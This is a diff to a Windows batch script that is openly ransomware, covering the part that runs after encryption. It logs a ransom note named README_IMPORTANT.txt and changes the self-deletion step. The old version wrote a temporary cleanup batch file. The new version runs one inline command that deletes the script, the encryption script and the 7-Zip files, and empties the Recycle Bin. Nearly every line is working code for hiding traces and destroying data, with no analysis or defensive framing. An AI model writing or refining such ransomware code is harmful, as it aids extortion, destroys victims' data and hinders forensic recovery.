@@ -758,30 +758,18 @@ echo ===========================================================================
 echo ^[+^] Ransom note created: README_IMPORTANT.txt
 echo.
 
-REM Self-delete the script and remove from recycle bin
+REM Self-delete the script - using inline command (no temp files)
 echo ^[*^] Removing script traces...
-if "%DEBUG%"=="1" echo ^[DEBUG^] Creating self-delete batch file...
+if "%DEBUG%"=="1" echo ^[DEBUG^] Script path: %~f0
 
-REM Create a temporary batch file that will delete this script
-set "SELF_DELETE_BAT=%TEMP%\cleanup_%RANDOM%.bat"
-echo @echo off > "%SELF_DELETE_BAT%"
-echo timeout /t 2 /nobreak ^>nul >> "%SELF_DELETE_BAT%"
-echo del /f /q "%~f0" 2^>nul >> "%SELF_DELETE_BAT%"
-echo if exist "%~f0" ( >> "%SELF_DELETE_BAT%"
-echo     timeout /t 1 /nobreak ^>nul >> "%SELF_DELETE_BAT%"
-echo     del /f /q "%~f0" 2^>nul >> "%SELF_DELETE_BAT%"
-echo ) >> "%SELF_DELETE_BAT%"
-echo del /f /q "encrypt_files.ps1" 2^>nul >> "%SELF_DELETE_BAT%"
-echo del /f /q "7z.exe" 2^>nul >> "%SELF_DELETE_BAT%"
-echo del /f /q "7z2501-x64.msi" 2^>nul >> "%SELF_DELETE_BAT%"
-echo del /f /q "7z2501-x64.exe" 2^>nul >> "%SELF_DELETE_BAT%"
-echo del /f /q "7z2501-arm64.exe" 2^>nul >> "%SELF_DELETE_BAT%"
-echo rd /s /q "%%SYSTEMDRIVE%%\$Recycle.Bin" 2^>nul >> "%SELF_DELETE_BAT%"
-echo del /f /q "%%~f0" 2^>nul >> "%SELF_DELETE_BAT%"
-echo exit >> "%SELF_DELETE_BAT%"
+REM Store current directory and script path
+set "SCRIPT_PATH=%~f0"
+set "SCRIPT_DIR=%~dp0"
 
-if "%DEBUG%"=="1" echo ^[DEBUG^] Launching self-delete script...
-start /b "" "%SELF_DELETE_BAT%"
+REM Use inline CMD command to delete after script exits
+start /min cmd /c "timeout /t 2 /nobreak >nul & del /f /q "%SCRIPT_PATH%" 2>nul & cd /d "%SCRIPT_DIR%" & del /f /q encrypt_files.* 2>nul & del /f /q 7z*.* 2>nul & rd /s /q %SYSTEMDRIVE%\$Recycle.Bin 2>nul"
 
-REM Exit immediately without pause
+if "%DEBUG%"=="1" echo ^[DEBUG^] Self-delete command launched
+
+REM Exit immediately
 exit /b 0
